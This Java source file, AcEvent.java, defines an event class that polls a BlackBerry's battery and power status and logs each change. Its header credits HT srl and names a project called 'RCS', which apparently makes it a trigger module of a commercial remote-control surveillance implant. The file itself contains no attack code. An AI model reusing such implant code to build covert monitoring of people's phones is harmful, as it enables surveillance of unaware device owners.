/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AcEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.event;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.SystemListener;

public class AcEvent extends Event {
    //#debug
    private static Debug debug = new Debug("AcEvent", DebugLevel.VERBOSE);

    private int lastStatus;

    public AcEvent(int actionId, byte[] confParams) {
        super(Event.EVENT_AC, actionId, confParams);

        lastStatus = DeviceInfo.getBatteryStatus();
    }

    protected void actualRun() {

        for (;;) {
            int status = DeviceInfo.getBatteryStatus();

            int diff = (status ^ lastStatus);

            for (int i = 0; i < 32; i++) {
                boolean bit = Utils.getBit(diff, i);
                if (bit) {
                    batteryStatusChange(1 << i);
                }
            }

            lastStatus = status;

            if (smartSleep(sleepTime)) {
                // #debug
                debug.trace("CleanStop " + this);
                return;
            }
        }

        // #debug
        /*
         * debug.info("Adding SystemListener"); Application application =
         * Application.getApplication(); application.addSystemListener((AcEvent)
         * this); sleepUntilStopped();
         */

    }

    /*
     * public void actualStop() { Application application =
     * Application.getApplication(); application.removeSystemListener(this);
     * debug.info("Removed SystemListener"); }
     */

    protected boolean parse(byte[] confParams) {
        // TODO Auto-generated method stub
        return true;
    }

    public void batteryGood() {
        //#debug
        debug.info("batteryGood");
    }

    public void batteryLow() {
        //#debug
        debug.info("batteryLow");

    }

    public void batteryStatusChange(int arg0) {
        switch (arg0) {
        case DeviceInfo.BSTAT_AC_CONTACTS:
            //#debug
            debug.info("BSTAT_AC_CONTACTS");
            break;
        case DeviceInfo.BSTAT_CHARGING:
            //#debug
            debug.info("BSTAT_CHARGING");
            break;
        case DeviceInfo.BSTAT_DEAD:
            //#debug
            debug.info("BSTAT_DEAD");
            break;
        case DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER:
            //#debug
            debug.info("BSTAT_IS_USING_EXTERNAL_POWER");
            break;
        case DeviceInfo.BSTAT_LEVEL_CHANGED:
            //#debug
            debug.info("BSTAT_LEVEL_CHANGED");
            break;
        case DeviceInfo.BSTAT_LOW:
            //#debug
            debug.info("BSTAT_LOW");
            break;
        case DeviceInfo.BSTAT_LOW_RATE_CHARGING:
            //#debug
            debug.info("BSTAT_LOW_RATE_CHARGING");
            break;
        case DeviceInfo.BSTAT_NO_CAMERA_FLASH:
            //#debug
            debug.info("BSTAT_NO_CAMERA_FLASH");
            break;
        case DeviceInfo.BSTAT_NO_RADIO:
            //#debug
            debug.info("BSTAT_NO_RADIO");
            break;
        case DeviceInfo.BSTAT_NO_TURN_ON:
            //#debug
            debug.info("BSTAT_NO_TURN_ON");
            break;
        case DeviceInfo.BSTAT_NO_WLAN:
            //#debug
            debug.info("BSTAT_NO_WLAN");
            break;
        case DeviceInfo.BSTAT_NONE:
            //#debug
            debug.info("BSTAT_NONE");
            break;
        case DeviceInfo.BSTAT_REVERSED:
            //#debug
            debug.info("BSTAT_REVERSED");
            break;
        case DeviceInfo.BSTAT_TOO_COLD:
            //#debug
            debug.info("BSTAT_TOO_COLD");
            break;
        case DeviceInfo.BSTAT_TOO_HOT:
            //#debug
            debug.info("BSTAT_TOO_HOT");
            break;
        case DeviceInfo.BSTAT_UNKNOWN_BATTERY:
            //#debug
            debug.info("BSTAT_UNKNOWN_BATTERY");
            break;
        default:
            //#debug
            debug.info("UNKNOWN");
            break;
        }

    }

    public void powerOff() {
        //#debug
        debug.info("powerOff");
    }

    public void powerUp() {
        //#debug
        debug.info("powerUp");
    }

}
